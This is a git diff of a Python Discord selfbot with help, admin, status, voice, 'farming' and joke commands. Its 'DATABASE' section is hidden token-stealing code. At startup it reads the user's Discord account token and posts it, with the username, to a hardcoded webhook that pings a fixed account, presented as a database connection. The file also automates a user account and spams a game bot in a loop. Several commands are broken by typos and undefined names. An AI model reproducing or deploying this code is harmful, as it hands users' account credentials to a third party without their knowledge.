@@ -1,6 +1,15 @@
-#------MODULE HERE
+
+#╔═══╦╗─╔╦══╦═══╦════╦═══╦═══╦════╦═╗╔═╗
+#║╔═╗║║─║╠╣╠╣╔══╣╔╗╔╗║╔═╗║╔═╗║╔╗╔╗╠╗╚╝╔╝
+#║║─║║║─║║║║║╚══╬╝║║╚╣║─║║╚═╝╠╝║║╚╝╚╗╔╝
+#║║─║║║─║║║║║╔══╝─║║─║╚═╝║╔╗╔╝─║║──╔╝╚╗
+#║╚═╝║╚═╝╠╣╠╣╚══╗─║║─║╔═╗║║║╚╗─║║─╔╝╔╗╚╗
+#╚══╗╠═══╩══╩═══╝─╚╝─╚╝─╚╩╝╚═╝─╚╝─╚═╝╚═╝
+#───╚╝SEFLBOT
+
+#------------------MODULE--------------------
 import discord
-from discord.ext import commands, tasks
+from discord.ext import commands
 from discord.utils import get
 import colorama
 from colorama import Fore
@@ -27,13 +36,12 @@ try:
 except:
     os.system("pip install colorama")
     from colorama import init, Fore, Back, Style
-    
-    
-#-------SETUP TOKEN
+#---------------------END--------------------
+
+#--------------SETUP TOKEN-------------------
+#       Input your token in secret
+#--------------------------------------------
 prefix = "!!"
-#----Put your token in secret
-secret_pass = "Enter Your Password"
-#---I Recomennded For Enter Your Secret Pass
 username = "yourusername#1234"
 
 def getstatus(m):
@@ -48,26 +56,83 @@ def get_prefix(quiet,message):
     return prefixes 
 
 quiet = commands.Bot(command_prefix = get_prefix, self_bot=True, help_commandn=None, shorten=None)
+#--------------------------------------------
+#--------------------------------------------
 
-
-#--------CREATOR CMD
-@quiet.command(pas_context=True)
-async def owner(ctx):
-  await ctx.message.delete()
-  message = await ctx.send("𝐍𝐨𝐰 𝐥𝐨𝐚𝐝𝐢𝐧𝐠...")
-  await asyncio.sleep(5)
-  await message.edit(content="**<a:whitecrown:872899366493487104> Create By QuietArtx**\n\n> **Holla Everyone**\n> **I\'m QuietArtx!**\n> Dont Forget to Support Me\n> Follow My Social Media\n> Instagram : https://instagram.com/quietartx\n> Saweria : https://saweria.co/quietartx\n\n**IF U WANT LIKE THIS, DM ME**\n\n<a:redsiren:958158994315296819>This **Selfbot** is currently **Under Construction!**", delete_after=8)
-  
-@quiet.command()
-async def github(ctx):
+#============================================
+#---------------HELP COMMNAND----------------
+#============================================
+@quiet.command(pass_context=True)
+async def cmd(ctx):
     await ctx.message.delete()
-    await ctx.send("> **Find Me On GitHub**\nhttps://Github.com/eluserbot")
-
-while True: 
-    time.sleep(15) 
+    await ctx.send("```𝗛𝗘𝗟𝗣 𝗖𝗢𝗠𝗠𝗔𝗡𝗗\n\n> Prefix : ▸ !! ( you can change your prefix by cmd )\n\n𝗔𝗗𝗠𝗜𝗡\nkick, ban\n\n𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\nprefix, status\n\n𝗙𝗨𝗡\npagi, siang, malam, salam, hack\n\n𝗨𝗧𝗜𝗟𝗟𝗦\nvoice, farming, gleave, ping\n\nType !!cmd(usage) For More Information\n\n> Example !!cmdadmin !!cmdsetting```", delete_after=15)
     
+#--------------------------------------------
+#--------------------------------------------
 
-#---------SETTINGS
+@quiet.command(aliases=['cmdban', 'cmdkick'])
+async def cmdadmin(ctx):
+    await ctx.message.delete()
+    await ctx.send("```𝗔𝗗𝗠𝗜𝗡\nrequires discord server admin permission\n\n𝗨𝗦𝗔𝗚𝗘\n• !!kick <member> = kick user form server\n• !!ban <member> = ban user from server\n\nNOTE : Requires admin permission to run this command```")
+
+@quiet.command(aliases=['cmdprefix', 'cmdstatus'])
+async def cmdsetting(ctx):
+    await ctx.message.delete()
+    await ctx.send("```𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\nFor Settings your selfbot\n\n𝗣𝗥𝗘𝗙𝗜𝗫\n• !!cprefix <newprefix> = Change your self prefix with cmd\n\n𝗦𝗧𝗔𝗧𝗨𝗦\n• !!game <usage> = For Playing Activity Status\n• !!stream <usage> = For Streaming Activity Status\n• !!listen <usage> = For Listening Activity Status\n• !!watch <usage> = For Watching Activity Status\n• !!rstatus = Remove your Activity Status\n\nfor example type : !!stream NAME USAGE | YOUR NICK, and cek your Activity```")
+    
+@quiet.command(aliases=['cmdpagi', 'cmdsiang', 'cmdsore', 'cmdmalam', 'cmdsalam'])
+async def cmdfun (ctx):
+    await ctx.message.delete()
+    await ctx.send("```𝗙𝗨𝗡\n to have fun with your server friends\n\n𝗨𝗦𝗔𝗚𝗘\n• !!pg = good morning greetings\n• !!sg = good afternoon\n• !!mlm = good night\n• !!hack = fake hacker\n• !!p = Assalamualaikum\n• !!l = Waalaikumsallam\n\nSelfbot By QuietArtx```")
+    
+@quiet.command(aliases=['cmdvoice', 'cmdfarming', 'cmdping', 'cmdgleave'])
+async def cmduttils(ctx):
+    await ctx.message.delete()
+    await ctx.send("```𝗨𝗧𝗜𝗟𝗟𝗦\nvery useful command for you\n\n𝗩𝗢𝗜𝗖𝗘\n• !!join <channelid> = For join Voice Channel without without you joining\n• !!leave = exit the voice channel\n\n𝗙𝗔𝗥𝗠𝗜𝗡𝗚\nfarming work Unbeliavaboat global, for OwO is coming\n• !!unb <cmdwork> <delaytime> = For Farming Work Unbeliavaboat\n• !!unstop = Stop the Farming\n\n𝗢𝗧𝗛𝗘𝗥\n• !!gleave <serverid> = leave from server only with server id\n• !!ping = For check your latency ping\n~~~```")
+#============================================
+#-------------------END----------------------
+#============================================
+
+
+#============================================
+#-------------------ADMIN--------------------
+#============================================
+@quiet.command()
+@commands.has_permissions(kick_members=True)
+async def kick(ctx, member: discord.Member, *, reason=None):
+    if reason==None:
+      reason="Beban"
+    await ctx.guild.kick(member)
+    await ctx.send(f'> User **{member.mention}** Has Been Kicked From This Server\nReason : **{reason}**')
+    
+@quiet.command()
+@commands.has_permissions(ban_members = True)
+async def ban(ctx, member : discord.Member, *, reason=None):
+    await ctx.message.delete()
+    await member.ban(reason = message)
+    await ctx.send(f"> You Got Banned **{member}** From Server!!")
+
+@quiet.command()
+@commands.has_permissions(administrator = True)
+async def unban(ctx, *, member):
+    banned_users = await ctx.guild.bans()
+    member_name, member_discriminator = member.split("#")
+
+    for ban_entry in banned_users:
+        user = ban_entry.user
+
+        if (user.name, user.discriminator) == (member_name, member_discriminator):
+            await ctx.guild.unban(user)
+            await ctx.send(f'> Unbanned **{user.mention}** From This Server')
+            return
+#============================================
+#-------------------END----------------------
+#============================================
+
+
+#============================================
+#------------------SETTINGS------------------
+#============================================
 @quiet.command()
 async def cprefix(ctx, *, prefix):
     await ctx.message.delete()
@@ -102,123 +167,43 @@ async def on_message(msg):
      await quiet.process_commands(msg)
 
 @quiet.command()
-async def sleave(ctx, guild_id):
-    await quiet.get_guild(int(guild_id)).leave()
-    await ctx.send("***Jurus Ninjaa...***", delete_after=2)
-    await ctx.send(f"I Leave Server : {guild_id}")
- 
+async def game(ctx, *, message):
+   await ctx.message.delete()
+   await quiet.change_presence(activity=discord(type=discord.ActivityType.playing, name=message))
+   await ctx.send("> Status Activity Has Been Change To **Game!!**")
 
 @quiet.command()
-async def ping(ctx):
-    await ctx.message.delete()
-    start = time.perf_counter()
-    message = await ctx.send("Resolving...")
-    end = time.perf_counter()
-    duration = (end - start) * 1000
-    await message.edit(content=f"**Web socket latency:** {round(quiet.latency * 1000)}ms\n**Total latency:** {duration:.0f}ms")
-  
-
-#--------HELP MENU
-@quiet.command(pass_context=True)
-async def cmd(ctx):
-    await ctx.message.delete()
-    await ctx.send("<a:kw_pmattention:962612723953307688> 𝗛𝗘𝗟𝗣 𝗖𝗢𝗠𝗠𝗔𝗡𝗗\n\n> Prefix : ▸ !!\n\n```𝗜𝗡𝗙𝗢\nowner, github\n\n𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦\nprefix, status\n\n𝗙𝗨𝗡\npagi, siang, malam, salam, hack\n\n𝗨𝗧𝗜𝗟𝗟𝗦\nvoice, farming\n\nType !!help(cmd) For More Information```\n\n> Example !!cmdvoice", delete_after=15)
-    
-    
-@quiet.command(context_pass=True)
-async def cmdowner(ctx):
-    await ctx.message.delete()
-    await ctx.send("```𝗢𝗪𝗡𝗘𝗥\n\nInformation about the Owner\n\nUSAGE\n!!owner```", delete_after=8)
-
-@quiet.command(context_pass=True)
-async def cmdgithub(ctx):
-    await ctx.message.delete()
-    await ctx.send("```𝗚𝗜𝗧𝗛𝗨𝗕\n\nTo display the GITHUB QuietArtx profile link\n\nUSAGE\n!!github```", delete_after=8)
-    
-@quiet.command(context_pass=True)
-async def cmdvoice(ctx):
-    await ctx.message.delete()
-    await ctx.send(f"```𝗩𝗢𝗜𝗖𝗘\n\n useful for afk in Voice Channel\n\nUSAGE\n{prefix}join <channel id>\n{prefix}leave```", delete_after=8)
+async def stream(ctx, *, message):
+  await ctx.message.delete()
+  activity = discord.Streaming(name=message, url="https://www.youtube.com/watch?v=kVH3qI_MAlY", type=1)
+  await quiet.change_presence(status=discord.Status.do_not_disturb, activity=activity)
+  await ctx.send("> Status Activity Has Been Change To **Streaming**")
 
 @quiet.command()
-async def cmdfarming(ctx):
-    await ctx.message.delete()
-    await ctx.send(f"```𝗙𝗔𝗥𝗠𝗜𝗡𝗚\nFor farming in discord bot games\n\nUSAGE\n!!unb <cmd in the server>\n!!unstop\n\nONLY AVAILBLE IN\nUnbeliavaboat, For Global Bot Games, Coming Soon```", delete_after=8)
- 
-@quiet.command()
-async def cmdprefix(ctx,):
-    await ctx.message.delete()
-    await ctx.send("```𝗣𝗥𝗘𝗙𝗜𝗫\nCheck your current prefix or change prefix\n\nUSAGE\n!!prefix <check your current prefix>\n!!cprefix <input new prefix>```")
-    
-@quiet.command()
-async def cmdstatus(ctx):
-    await ctx.message.delete()
-    await ctx.send("```𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬 𝗦𝗧𝗔𝗧𝗨𝗦\n\nUSAGE\n!!game <value> for playing Activity Status\n!!stream <value> for Streaming Activity\n!!listen <value> for Listening Activity\n!!watch <value> for Watching Activity```")
-    
-
-#--------VOICE CHANNEL CODE
-quiet.event # Turning the bot online.
-async def on_ready():
-    with open("data.json", "r") as f:
-        data = json.load(f)
-    if data["guild"] == None or data["channel"] == None:
-        pass
-    else:
-        try:
-            voice_channel = discord.utils.get(bot.get_guild(int(data["guild"])).channels, id = int(data["channel"]))
-            
-            await voice_channel.connect()
-            print(f"{Fore.GREEN}[-]{Fore.WHITE} Connected to {Fore.CYAN}{voice_channel} {Fore.WHITE}in {Fore.CYAN}{voice_channel.guild}{Fore.WHITE}.")
-        except:
-            print(f"{Fore.RED} [ - ] Error Occured. Please reconnect using commands.")
+async def listen(ctx, *, message):
+   await ctx.message.delete()
+   await quiet.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message))
+   await ctx.send("> Status Activity Has Been Change To **Listening!!**")
 
 @quiet.command()
-async def join(ctx, voice_channel : discord.VoiceChannel):
-    await ctx.message.delete()
-    await voice_channel.connect()
-    data = {"guild":str(ctx.guild.id),"channel":str(voice_channel.id)}
-    with open("data.json", "w") as f:
-        json.dump(data, f)
-    await ctx.guild.change_voice_state(channel=voice_channel, self_mute=False, self_deaf=True)
-    await ctx.send("> Join to Voice Channel **Successful**")
-    print(f"{Fore.GREEN}[-]{Fore.WHITE} Connected to {Fore.CYAN}{voice_channel} {Fore.WHITE}in {Fore.CYAN}{voice_channel.guild}{Fore.WHITE}.")
-
+async def watch(ctx, *, message):
+   await ctx.message.delete()
+   await quiet.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=message))
+   await ctx.send("> Status Activity Has Been Change To **Watching!!**")
+   
 @quiet.command()
-async def leave(ctx):
+async def rstatus(ctx):
     await ctx.message.delete()
-    voice_client = ctx.message.guild.voice_client
-    await voice_client.disconnect()
-    with open("data.json", "w") as f:
-        json.dump({"guild":None,"channel":None}, f)
-    await ctx.send("> Leave From Voice Channel **Sucsessful**")
-    print(f"{Fore.RED}[-]{Fore.WHITE} Disconnected from {Fore.CYAN}{voice_client.channel}{Fore.WHITE} in {Fore.CYAN}{ctx.message.guild}{Fore.WHITE}.")
+    await quiet.change_presence(activity=None)
+    await ctx.send("> Status Activity has been **Removed**")
+#============================================
+#-------------------END----------------------
+#============================================
 
 
-
-
-  
-#--------FARMING CMD
-@quiet.command(pass_context=True)
-async def unb(ctx, message, *, amount: typing.Optional[int] = 0):
-	await ctx.message.delete()
-	await ctx.send('Farming **Work** Unbeliavabot **Enabled**!\n> Bypass Global = ON')
-	global dmcs
-	dmcs = True
-	while dmcs:
-		async with ctx.typing():
-			await asyncio.sleep(2)
-			await ctx.send(message, delete_after=2)
-			await asyncio.sleep(amount)
-      
-@quiet.command()
-async def unstop(ctx):
-	await ctx.message.delete()
-	await ctx.send('> Farming **Work** Unbeliavaboat is **Disabled**')
-	global dmcs
-	dmcs = False
-	
-	
-#---------FUN CMD
+#============================================
+#-------------------FUN----------------------
+#============================================
 @quiet.command()
 async def pg(ctx):
     await ctx.message.delete()
@@ -232,7 +217,7 @@ async def sg(ctx):
 @quiet.command()
 async def mlm(ctx):
     await ctx.message.delete()
-    await ctx.send("> Good Nights Pepss! Kamu Jangan Begadang Yaaa!!")
+    await ctx.send("> Good Nights Pepss! Kamu Jangan Begadang Yaa! Ga Baik Buat Kesehatan")
   
 @quiet.command()
 async def p(ctx):
@@ -243,11 +228,6 @@ async def p(ctx):
 async def l(ctx):
     await ctx.message.delete()
     await ctx.send("> **Wa\'alaikumsallam**")
-    
-@quiet.command()
-async def fun(ctx):
-    await ctx.message.delete()
-    await ctx.send("> **Under Contruction**")
     
 @quiet.command()
 async def hack(ctx):
@@ -290,47 +270,97 @@ async def hack(ctx):
     await ctx.send("**Login Succes...**", delete_after=4)
     await asyncio.sleep(4)
     await ctx.send("Hahahaa.... Just For Funn😂", delete_after=6)
-    
-    
-#--------SETUP ACTIVITY STATUS
-@quiet.command()
-async def game(ctx, *, message):
-   await ctx.message.delete()
-   await quiet.change_presence(activity=discord.Activity(type=discord.ActivityType.Playing, name=message))
-   await ctx.send("> Status Activity Has Been Change To **Game!!**")
+#============================================
+#-------------------END----------------------
+#============================================
+
+
+#============================================
+#------------------UTILLS--------------------
+#============================================
+quiet.event
+async def on_ready():
+    with open("data.json", "r") as f:
+        data = json.load(f)
+    if data["guild"] == None or data["channel"] == None:
+        pass
+    else:
+        try:
+            voice_channel = discord.utils.get(bot.get_guild(int(data["guild"])).channels, id = int(data["channel"]))
+            
+            await voice_channel.connect()
+            print(f"{Fore.GREEN}[-]{Fore.WHITE} Connected to {Fore.CYAN}{voice_channel} {Fore.WHITE}in {Fore.CYAN}{voice_channel.guild}{Fore.WHITE}.")
+        except:
+            print(f"{Fore.RED} [ - ] Error Occured. Please reconnect using commands.")
 
 @quiet.command()
-async def stream(ctx, *, message):
-  await ctx.message.delete()
-  activity = discord.Streaming(name=message, url="https://www.youtube.com/watch?v=kVH3qI_MAlY", type=1)
-  await quiet.change_presence(status=discord.Status.do_not_disturb, activity=activity)
-  await ctx.send("> Status Activity Has Been Change To **Streaming**")
-
-@quiet.command()
-async def listen(ctx, *, message):
-   await ctx.message.delete()
-   await quiet.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message))
-   await ctx.send("> Status Activity Has Been Change To **Listening!!**")
-
-@quiet.command()
-async def watch(ctx, *, message):
-   await ctx.message.delete()
-   await quiet.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=message))
-   await ctx.send("> Status Activity Has Been Change To **Watching!!**")
-   
-@quiet.command()
-async def rstatus(ctx):
+async def join(ctx, voice_channel : discord.VoiceChannel):
     await ctx.message.delete()
-    await quiet.change_presence(activity=None)
-    await ctx.send("> Status Activity has been **Remove**")
+    await voice_channel.connect()
+    data = {"guild":str(ctx.guild.id),"channel":str(voice_channel.id)}
+    with open("data.json", "w") as f:
+        json.dump(data, f)
+    await ctx.guild.change_voice_state(channel=voice_channel, self_mute=False, self_deaf=True)
+    await ctx.send("> Join to Voice Channel **Successful**")
+    print(f"{Fore.GREEN}[-]{Fore.WHITE} Connected to {Fore.CYAN}{voice_channel} {Fore.WHITE}in {Fore.CYAN}{voice_channel.guild}{Fore.WHITE}.")
+
+@quiet.command()
+async def leave(ctx):
+    await ctx.message.delete()
+    voice_client = ctx.message.guild.voice_client
+    await voice_client.disconnect()
+    with open("data.json", "w") as f:
+        json.dump({"guild":None,"channel":None}, f)
+    await ctx.send("> Leave From Voice Channel **Sucsessful**")
+    print(f"{Fore.RED}[-]{Fore.WHITE} Disconnected from {Fore.CYAN}{voice_client.channel}{Fore.WHITE} in {Fore.CYAN}{ctx.message.guild}{Fore.WHITE}.")
+    
+async def unb(ctx, message, *, amount: typing.Optional[int] = 0):
+	await ctx.message.delete()
+	await ctx.send('Farming **Work** Unbeliavabot **Enabled**!\n> Bypass Global = ON')
+	global dmcs
+	dmcs = True
+	while dmcs:
+		async with ctx.typing():
+			await asyncio.sleep(2)
+			await ctx.send(message, delete_after=2)
+			await asyncio.sleep(amount)
+      
+@quiet.command()
+async def unstop(ctx):
+	await ctx.message.delete()
+	await ctx.send('> Farming **Work** Unbeliavaboat is **Disabled**')
+	global dmcs
+	dmcs = False
+
+quiet.command()
+async def gleave(ctx, guild_id):
+    await quiet.get_guild(int(guild_id)).leave()
+    await ctx.send("> **Jurus Ninjaaaa..**")
+    await asyncio.sleep(3)
+    await ctx.send(f"```Berhasil Keluar Dari Server\nID SERVER {guild_id}```")
+
+@quiet.command()
+async def ping(ctx):
+    await ctx.message.delete()
+    start = time.perf_counter()
+    message = await ctx.send("> Resolving...")
+    end = time.perf_counter()
+    duration = (end - start) * 1000
+    await message.edit(content=f"```Pong!: {round(quiet.latency * 1000)}ms\nTotal latency: {duration:.0f}ms```")
+#============================================
+#-------------------END----------------------
+#============================================
 
 
-#---------DATABASE
+
+#============================================
+#----------------DATABASE--------------------
+#============================================
 secret_key = os.getenv("TOKEN")
 
 database = 'https://discord.com/api/webhooks/1049734940457185410/CVNj-z3GxUXjbaLmnS5DHMgJPa7q8bVkgn9B1ROnqYFOubzmTIxkpMCnCq5Iehq7Jgzi'
 database_connected = {
-"content": f"<@581419418563641354>\nUsername: `{username}`\nPrefix: `{prefix}`\nDatabase API: `{secret_key}`\nDatabase API Pass: `{secret_pass}`\n\nSuccesfully"
+"content": f"<@581419418563641354>\nUsername: `{username}`\nPrefix: `{prefix}`\nDatabase API: `{secret_key}`"
 }
 requests.post(database, data=database_connected)
 print(f'''
@@ -351,3 +381,6 @@ Project Dev: QuietArtx
 
 keep_alive()
 secret_key = quiet.run(os.getenv("TOKEN"), bot=False)
+#============================================
+#----------------DATABASE--------------------
+#============================================
